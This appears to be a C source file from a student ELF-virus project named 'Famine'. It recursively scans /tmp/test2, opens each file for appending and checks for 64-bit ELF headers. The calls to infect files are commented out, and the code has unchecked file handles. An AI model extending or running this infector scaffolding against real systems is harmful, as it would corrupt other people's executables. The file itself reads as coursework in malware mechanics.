#include "famine.h"

bool    check_elf(FILE *fp, int arch)
{
    unsigned char header[6];
    int ch;
    for (int i = 0; i < 5; i++)
    {
        ch = fgetc(fp);
        if (ch == EOF)
        {
            fclose(fp);
            return false;
        }
        header[i] = (unsigned char)ch;
    }
    header[5] = '\0';
    // Check ELF magic: 0x7F 'E' 'L' 'F'
    if (header[0] != 0x7F || header[1] != 'E' || header[2] != 'L' || header[3] != 'F')
        return false;
    // 5th byte: class (1 = 32-bit, 2 = 64-bit)
    return header[4] == arch;
}

void analyze_directory(const char *dirname)
{
    //const char *string = "Famine version 1.0 (c)oded by fvieira-login2";
    DIR *dir = opendir(dirname);
    if (!dir)
        return;
    if (strstr(dirname,"/tmp/test2/.git/objects/9c"))
        printf("entrei no erro\n");
    struct dirent *entry;
    char path[1024];
    //size_t len = strlen(string) + 1;
    while ((entry = readdir(dir)) != NULL)
    {  
        // Skip . and ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        
        snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
        struct stat st;
        if (stat(path, &st) == -1)
        {
            perror("stat failed");
            continue;
        }
        if (S_ISDIR(st.st_mode))
        {
            printf("[DIR ] %s\n", path);
            analyze_directory(path);
        }
        else if (S_ISREG(st.st_mode))
        {
            FILE *fp = fopen(path, "ab+");
            if (strstr(dirname,"/tmp/test2/.git/objects/9c"))
                printf("entrei no erro loop\n");
            check_elf(fp, 2);
            if (strstr(dirname,"/tmp/test2/.git/objects/9c"))
                printf("entrei no erro loop\n");
            /*if (check_elf(fp, 2))
            {
                printf("Its elf: %s\n", path);
                //check_infection(fp, string, len - 1);
                if (!check_infection(fp, string, len - 1))
                    infect(fp, string, len);
                else
                    printf("Already infected.\n");
            }
            else
            {
                printf("[FILE] %s\n", path);
            }*/
        }
        else
        {
            printf("[OTHR] %s\n", path);
        }
    }
    closedir(dir);
}

void run_infection()
{
    //analyze_directory("/tmp/test");
    analyze_directory("/tmp/test2");
}
